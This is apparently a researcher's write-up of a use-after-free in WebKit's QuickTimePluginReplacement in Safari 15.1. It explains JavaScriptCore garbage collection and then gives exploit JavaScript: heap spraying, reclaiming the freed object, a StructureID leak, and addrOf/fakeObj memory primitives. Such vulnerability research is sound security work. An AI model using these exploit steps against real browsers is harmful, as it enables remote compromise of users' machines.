# WebKit QuickTimePluginReplacement Use-after-free

## Affected Version

tag: releases/Apple/Safari-15.1-macOS-12.0.1

## Description of the vulnerability

Free objects are only handled if it was allocated inside heap zones mangaged by GarbageCollector. By then, GC craetes some write-barriers placed where the pointer is accessed to write. It is a small piece of instrumentation that executes after every write to an object — that tells the GC about writes to old objects. However, that instrumentation code is not existed in binding part. Therefore, if we get a pointer when we stay in a binding api, GC will never know that pointer has been referenced, which results in an Use-after-free.

Primary Heap has two type of subspace, which help him to manage allocations:

* IsoSubspace: contains basic JSValue such as array, function, ...
* CompleteSubspace: contains butterfly, object, ...

In this writeup, we only focus on the pool of JSObject, which belongs to `CompleteSubspace`. Each time we create an object from JS code

```javascript
var obj = {a: 1, b: 2, c: 3, d: 4}
```

WebKit calls to `CompleteSubspace::allocateNonVirtual` in file `CompleteSubspaceInlines.h` to find an available allocator for this object:

```c
if constexpr (validateDFGDoesGC)
        vm.heap.verifyCanGC();

    if (Allocator allocator = allocatorForNonVirtual(size, AllocatorForMode::AllocatorIfExists)) {
        return allocator.allocate(vm.heap, deferralContext, failureMode);
    }
    return allocateSlow(vm, size, deferralContext, failureMode);
```

`Allocator` is a handler for memory allocation on each block. WebKit has long used the simple segregated storage heap structure for small and medium-sized objects (up to about 8KB):
* Small and medium-sized objects are allocated from segregated free lists. Given a desired object size, WebKit performs a table lookup to find the appropriate free list and then pop the first object from this list
* Memory is divided into 16KB blocks. Each block contains cells. All cells in a block have the same cell size, called the block’s size class 
* At any time, the active free list for a size class contains only objects from a single block. When we run out of objects in a free list, we find the next block in that size class and sweep it to give it a free list

At the beginning, Webkit initializes some default allocators for size: 16, 32, 64, ... and stores it into `m_allocatorForSizeStep`:

#### WebKit Garbage Collector

Garbage Collector is used to collect unused cells. In order to determine which one should be collected, WebKit maintains a bitmap on each block's footer: 1 is alive, 0 is dead. After each wave of collection, GC put dead cell back to free list by calling `sweep(&m_freelist)`:

```c
template<...>
void MarkedBlock::Handle::specializedSweep(...)
{
    ...
    MarkedBlock& block = this->block();
    MarkedBlock::Footer& footer = block.footer();
    ...
    FreeCell* head = nullptr;
    size_t count = 0;
    uintptr_t secret;
    cryptographicallyRandomValues(&secret, sizeof(uintptr_t));
    bool isEmpty = true;
    Vector<size_t> deadCells;
    auto handleDeadCell = [&] (size_t i) {
        HeapCell* cell = reinterpret_cast_ptr<HeapCell*>(&block.atoms()[i]);

        if (destructionMode != BlockHasNoDestructors)
            destroy(cell);

        if (sweepMode == SweepToFreeList) {
            FreeCell* freeCell = reinterpret_cast_ptr<FreeCell*>(cell);
            if (scribbleMode == Scribble)
                scribble(freeCell, cellSize);
            freeCell->setNext(head, secret);
            head = freeCell;
            ++count;
        }
    };
    for (size_t i = 0; i < m_endAtom; i += m_atomsPerCell) {
        if (emptyMode == NotEmpty
            && ((marksMode == MarksNotStale && footer.m_marks.get(i))
                || (newlyAllocatedMode == HasNewlyAllocated && footer.m_newlyAllocated.get(i)))) {
            isEmpty = false;
            continue;
        }
        
        if (destructionMode == BlockHasDestructorsAndCollectorIsRunning)
            deadCells.append(i);
        else
            handleDeadCell(i);
    }
    ...   
}
```

Then after garbage collection, a summary of directory will be retrieved, each `-` represents a block in the directory:

```
{DoesNotNeedDestruction, JSCell}
    Live:                   1---------------
    Empty:                  ----------------
    Allocated:              ----------------
    CanAllocateButNotEmpty: 1---------------
    Destructible:           ----------------
    Eden:                   ----------------
    Unswept:                1---------------
    MarkingNotEmpty:        1---------------
    MarkingRetired:         ----------------
```

Note that, `MarkingRetired` means although there are still some available cells, but if number of used cells greater than default threshold ( 0.9 ), then that block will not accept any new allocations. For example, a standard JSObject's size is 64, each block contains 16000 bytes then each block of JSObject may hold 251 cells, and we cannot allocate over 225 cells.

> We bias the mark count so that if m\_biasedMarkCount >= 0 then the block should be retired. We go to all this trouble to make marking a bit faster: this way, marking knows when to retire a block using a js/jns on m\_biasedMarkCount. For example, if a block has room for 100 objects and retirement happens whenever 90% are live, then m\_markCountBias will be -90. This way, when marking begins, this will cause us to set m\_biasedMarkCount to -90 as well, since:

> m\_biasedMarkCount = actualMarkCount + m\_markCountBias.

> Marking an object will increment m\_biasedMarkCount. Once 90 objects get marked, we will have m\_biasedMarkCount = 0, which will trigger retirement.

So how GC marks a cell as dead or alive? GC is ordinarily a graph search problem and the heap is ordinarily just a graph: the roots are the local variables, their values are directional edges that point to objects, and those objects have fields that each create edges to some other objects. WebKit’s garbage collector also allows the DOM, compiler, and type inference system to install constraint callbacks. 

```c
void Heap::addCoreConstraints()
{
    m_constraintSet->add(
        "Cs", "Conservative Scan",
        ...
        visitor.append(conservativeRoots);
        ...);
    
    m_constraintSet->add(
        "Msr", "Misc Small Roots",
        ...);
    ...
}

```

These constraints are allowed to query which objects are marked and they are allowed to mark objects. The WebKit GC algorithm executes these constraints to fixpoint. GC termination happens when all marked objects have been visited and none of the constraints want to mark anymore objects. For example, `Conservative Scan` means WebKit starts from stack memory, gathers all pointers and visits all of there references. Basically, before collecting, WebKit saves information of last marked cells, then clears all marks. During collection process, WebKit visits all cells based on constraints and references and marks them, so eventually, unmarked cells become dead cells.

### The Vulnerability

Class QuickTimePluginReplacement has a raw pointer `m_scriptObject` points to an internal JSObject:

```c
class QuickTimePluginReplacement final : public PluginReplacement {
private:
    ...
    JSC::JSObject* m_scriptObject { nullptr };
};
```

At the beginning, this object was retrieved from JavaScript context by calling `get` method:

```c
value = replacement.get(lexicalGlobalObject, JSC::Identifier::fromString(vm, "scriptObject"));
    if (!scope.exception() && !value.isUndefinedOrNull()) {
        m_scriptObject = value.toObject(lexicalGlobalObject);
        scope.assertNoException();
    }
```

This is actually a function table in JS script ( `Source/WebCore/Modules/plugins/QuickTimePluginReplacement.js` ). After rendering, we can call to some of these apis by communicating with embeded tag.

```html
<embed id="worker" src="data:video/mp4;"></embed>
```

For example, when we call `worker.GetURL()`, codeflow will go to this C++ backend code, and find "GetURL" properety from `m_scriptObject`:

```c
JSC_DEFINE_CUSTOM_GETTER(pluginElementPropertyGetter, (JSGlobalObject* lexicalGlobalObject, EncodedJSValue thisValue, PropertyName propertyName))
{
    VM& vm = lexicalGlobalObject->vm();
    auto scope = DECLARE_THROW_SCOPE(vm);

    JSHTMLElement* thisObject = jsDynamicCast<JSHTMLElement*>(vm, JSValue::decode(thisValue));
    if (!thisObject)
        return throwVMTypeError(lexicalGlobalObject, scope);
    JSObject* scriptObject = pluginScriptObject(lexicalGlobalObject, thisObject);
    if (!scriptObject)
        return JSValue::encode(jsUndefined());

    return JSValue::encode(scriptObject->get(lexicalGlobalObject, propertyName));
}
```

Looking at `QuickTimePluginReplacement.js`, we see that `scriptObject` is hold by `this` or `Replacement` object, and moreover, `Replacaement` is also binded to `HTMLVideoElement` as a callback object:

```javascript
var video = this.video = document.createElement('video');

for (name in this.HandledVideoEvents)
    video.addEventListener(name, this, false);

this.root.appendChild(video);
```

So when we render an embeded tag, WebKit creates a hidden video tag under a shadowRoot. This is actually an anweser for question that why normally `scriptObject` lives eventhough the `Replacement` was only created, not assigned to any objects else. When we refresh an iframe containing this embeded tag, all things: the video element, original scriptObject, ... which were allocated by JS engine from the JS script above, will be discarded and collected by GarbageCollector in next wave of collection. However, because `m_scriptObject` is not handled by GarbageCollector, then now we are able to access to a freed JSObject via worker. In conclusion, the root cause of this bug is an HTMLPluginElement ( embeded tab ) hold indirectly a raw pointer from HTMLVideoElement ( video tag ).

### The Exploitation

First, we create iframe that include an embeded tag, register some callbacks so we can run our code after DOM object is discared and before new page is rendered successfully. Thanks to [Google Project Zero](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1879.html) we have the poc that makes WebKit crashed. Our goal now is to find a way to reclaim the freed object, do some magics and control PC register.

By adding some print function to source code, we know that size of the freed object is 64. This is a standard size of normal JSObject ( without inclined data ). We also know current state of current 64-size allocator, e.g free list, current block, ... In order to confirm that we can reclaim the freed object, we fill free list with our objects `var obj = {a: 1, b: 2, c: 3, d: 4}` then call `worker.a`, which should be undefined ( because there is no `a` method in scriptObject ) but now it will print 1.

```javascript
var spray_objs = [];
function callback(ev) {
    gc();
    for (let i=0; i<200; ++i)
        spray_objs.push({a: 1, b: 2, c: 3, d: 4});
    alert(worker.a);
}
```

However, at this point, we still cannot exploit anything, because the reclaimed object has same type as the freed object, and furthermore, WebKit C++ backend doesn't read or write based on any scriptObject's properties. A good approach is about trying to overlap the freed object, then corrupting its metadata ( type of object and its butterfly ). But this pointer stays in the middle of memory block, there is other live objects which was created during rendering embeded tag process, so we cannot make it empty and create new allocator to own the area this pointer belongs to. Another approach is about create some blocks that have empty holes to let new allocation jump into, but this is failed too due to retirement threshold. Fortunately, we have full access to scriptObject as a JSObject, then we can create a second-order of use-after-free: let reclaimed object refer to another object, undefine reclaim object and finally we can "steal" an empty block and use it for bigger allocator. Note that, a normal object stores data in its butterfly, so we have to force it to store in the same place as object, and the anwser is inclined data object.

```javascript
class InclinedObject {
    constructor() {
	this.a = 1,
	this.b = 2,
	this.c = 3,
	this.d = 4,
	this.e = 5,
	this.f = 6,
	this.g = 7,
	this.h = 8,
	this.i = 9,
	this.j = 10,
	this.k = 11,
	this.l = 12,
	this.m = 13,
	this.n = 14,
	this.o = 15,
	this.p = 16
    }
};

var spray_objs = [];
function callback(ev) {
    gc();
    for (let i = 0; i < 198; ++i)
        spray_obj.push({a: 1, b: 2, c: 3, d: 4, e: 5});
    let reclaim_obj = {a: 1, b: 2, c: 3, d: 4, e: 5};         // in place of freed object
    for (let i = 0; i < 2; ++i)
        spray_obj.push({a: 1, b: 2, c: 3, d: 4, e: 5});       // fill in block memory
    let dummy = {a: 1, b: 2, c: 3, d: 4, e: 5};               // new block is created
    let fake_obj = {a: 1, b: 2, c: 3, d: 4, e: 5};            // second cell of block memory, then we can overlap the metadata
    reclaim_obj.a = fake_obj;

    dummy = undefined;
    fake_obj = undefined;
    reclaim_obj = undefined;
    gc();

    var fake_arr = worker.a;
    var overwrite_obj = new InclinedObject();
}
```

So now, `overwrite_obj.g` is the same place as `fake_arr`. There is a problem here, when we "steal" block memory to a bigger allocator, WebKit has memset that block memory to 0xff, therefore we dont have a valid structure anymore, and if we dont give a valid structure to object, WebKit will abort immediately due to access to invalid pointer. Luckily, according to [P0 team](https://googleprojectzero.blogspot.com/2020/09/jitsploitation-two.html), Webkit can get property quickly by index instead of looking up in structure.

```c
static ALWAYS_INLINE JSValue getByVal(VM& vm, JSValue baseValue, JSValue subscript)
{
    ...;
    if (subscript.isUInt32()) {
        uint32_t i = subscript.asUInt32();
        if (baseValue.isObject()) {
            JSObject* object = asObject(baseValue);
            if (object->canGetIndexQuickly(i))
                return object->getIndexQuickly(i);
```

Here, `getIndexQuickly` directly loads the element from the butterfly, and `canGetIndexQuickly` only looks at the indexing type in the JSCell header (for which the values are known constants) and the length in the butterfly:

```c
bool canGetIndexQuickly(unsigned i) const {
    const Butterfly* butterfly = this->butterfly();
    switch (indexingType()) {
    ...;
    case ALL_CONTIGUOUS_INDEXING_TYPES:
        return i < butterfly->vectorLength() && butterfly->contiguous().at(this, i);
}
```

Here we choose to leak StructureID of next InclinedObject, by getting `fake_arr[12]` ( if we point the butterfly of `fake_arr` back to itself, then its vector length will be first 4 bytes of `overrwite_obj.f`, which is very large: 0x7fff0000 ):

```javascript
var leaked_header = Int64.from_double(fake_arr[12]);
// alert(leaked_header);
```

From now, with a valid StructureID, it is easy to make `addrOf` and `fakeObj` function:

```javascript
function addrOf(obj) {
    overwrite_obj.j = obj;
    return Int64.from_double(fake_arr[3]);
}

function fakeObj(addr) {
    fake_arr[3] = Int64.to_double(addr);
    return overwrite_obj.j;
}
```
